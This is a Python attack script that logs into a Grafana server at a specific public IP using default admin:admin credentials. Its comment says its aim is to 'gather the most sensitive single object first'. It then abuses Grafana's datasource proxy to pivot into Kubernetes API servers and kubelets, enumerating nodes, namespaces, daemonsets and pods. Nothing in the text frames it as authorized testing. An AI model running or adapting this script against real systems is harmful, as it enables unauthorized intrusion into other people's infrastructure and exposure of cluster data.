#!/usr/bin/env python3
"""Bootstrapping i4652: gather the most sensitive single object first."""
import json, time, base64, urllib.request, urllib.error

AUTH = "Basic " + base64.b64encode(b"admin:admin").decode()
G = "http://117.148.167.134:3000"

def req(url, hdrs=None, to=15, method="GET", data=None):
    r = urllib.request.Request(url, headers=dict(hdrs or {}), data=data, method=method)
    t0 = time.time()
    try:
        x = urllib.request.urlopen(r, timeout=to)
        b = x.read(60000).decode("utf-8", "replace")
        return {"code": x.status, "ms": int((time.time()-t0)*1000), "body": b[:9000]}
    except urllib.error.HTTPError as e:
        try: b = e.read()[:3000].decode("utf-8", "replace")
        except Exception: b = ""
        return {"code": e.code, "ms": int((time.time()-t0)*1000), "body": b}
    except Exception as e:
        return {"err": type(e).__name__ + ":" + str(e)[:100], "ms": int((time.time()-t0)*1000)}

def retry(url, hdrs=None, to=15, n=25, gap=3):
    last = None
    for i in range(n):
        r = req(url, hdrs, to)
        if r.get("code") is not None:
            return r
        last = r
        time.sleep(gap)
    return last

print("EGRESS", req("https://api.ipify.org", to=10).get("body"), flush=True)

# 0. wait for Grafana auth window
u = None
for i in range(40):
    r = req(G + "/api/user", {"Authorization": AUTH}, to=8)
    if r.get("code") == 200:
        u = r; print("GRAFANA_OK attempt", i, r["body"][:300], flush=True); break
    time.sleep(4)
if not u:
    print("GRAFANA_DOWN", flush=True); print("DONE"); raise SystemExit

API = [("d63006e5-b30f-4feb-b268-0b0d0807bf61", "k134_6443"),
       ("f7bcf6e3-16b8-453a-ad91-9e2793594cbc", "i120-api2"),
       ("be8601f2-9382-4493-9344-6d3af6bdf582", "k8sapi58073"),
       ("b631ece5-6d79-409e-9d21-12c9612d2bc8", "t19k8s-node"),
       ("ba4f3e49-6aea-419e-9a74-0d723e97cfc8", "t19k132adm"),
       ("aeb53d94-d19a-4eb3-a59d-7fca8f8e3f26", "nk8s"),
       ("d63610b1-d449-47d4-8a03-fe5256f7fe13", "t19kube134"),
       ("b5c51b5a-4454-47d5-adb8-f1b5ad492161", "i5542-anon134"),
       ("e3be8ccd-6bee-4f98-ad95-9dd4669ac523", "k8sapi-local")]
winner = None
for uid, name in API:
    r = retry(G + "/api/datasources/proxy/uid/" + uid + "/version", {"Authorization": AUTH}, to=12, n=4, gap=2)
    print("VERSION", name, json.dumps(r)[:400], flush=True)
    if isinstance(r, dict) and r.get("code") == 200 and "gitVersion" in (r.get("body") or ""):
        winner = uid; print("WINNER", name, uid, flush=True); break

if winner:
    for path in ["/api/v1/nodes?limit=200", "/api/v1/namespaces?limit=200",
                 "/apis/apps/v1/daemonsets", "/api/v1/pods?limit=1"]:
        r = retry(G + "/api/datasources/proxy/uid/" + winner + path, {"Authorization": AUTH}, to=25, n=6, gap=2)
        print("GETPATH", path, json.dumps(r)[:5000], flush=True)

# kubelet via ds (read pods)
for uid, name in [("b5398b47-4eb7-421c-852a-69863fe4af6c", "k134"),
                  ("c2b4d719-59bf-4483-b68d-72f3962fc87d", "t19kl-node"),
                  ("e1f45b56-714f-47e1-b29e-5ebedf9f09bf", "k142")]:
    r = retry(G + "/api/datasources/proxy/uid/" + uid + "/pods", {"Authorization": AUTH}, to=15, n=3, gap=2)
    print("KUBELET", name, json.dumps(r)[:1200], flush=True)
print("DONE", flush=True)
